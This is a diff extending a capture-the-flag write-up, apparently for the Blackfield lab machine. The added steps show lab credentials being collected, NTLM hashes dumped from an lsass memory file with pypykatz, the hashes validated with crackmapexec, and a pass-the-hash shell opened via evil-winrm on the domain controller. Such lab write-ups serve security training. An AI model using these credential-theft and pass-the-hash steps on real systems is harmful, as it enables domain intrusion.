@@ -294,6 +294,14 @@ SMB         10.10.10.192    445    DC01             profiles$       READ
 SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
 ```
 
+It worked. Now we have one more credential.
+
+| username | password |
+| --- | --- |
+| support | #00^BlackKnight | 
+| audit2020 | P@ssw0rd! |
+
+
 ```
 $ smbclient '//10.10.10.192/forensic' -U 'Audit2020'
 Password for [WORKGROUP\Audit2020]: P@ssw0rd!
@@ -323,3 +331,59 @@ Archive:  lsass.zip
 $ sudo umount /mnt/htb 
 ```
 
+With the lsass dump file, we can run pypykatz to try to extract the secrets from the file.
+```
+$ pypykatz lsa minidump --grep lsass.DMP | grep -i -e ':BLACKFIELD:'
+...
+msv:BLACKFIELD:svc_backup:9658d1d1dcd9250115e2205d9f48400d::463c13a9a31fc3252c68ba0a44f0221626a33e5c::::
+msv:BLACKFIELD:Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62::db5c89a961644f0978b4b69a4d2a2239d7886368::::
+...
+```
+
+We can use crakmapexec to test if the hashes are valid.
+```
+$ crackmapexec smb 10.10.10.192 -u 'administrator' -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE
+```
+`Administrator` credentials seems to be invalid.
+```
+$ crackmapexec smb 10.10.10.192 -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d   
+
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
+```
+`svc_backup` works.
+
+We can add this credention to our collection.
+
+| username | password | hash |
+| --- | --- | --- |
+| support | #00^BlackKnight | |
+| audit2020 | P@ssw0rd! | |
+| svc_backup | | 9658d1d1dcd9250115e2205d9f48400d |
+
+If we test WinRM we get access.
+```
+$ crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d 
+
+SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
+HTTP        10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
+WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
+```
+
+Lets use `Evil-WinRM` to access the machine.
+```
+$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+
+...
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> hostname
+DC01
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami
+blackfield\svc_backup
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> cat ..\Desktop\user.txt
+3920bb317a0bef51027e2852be64b543
+```
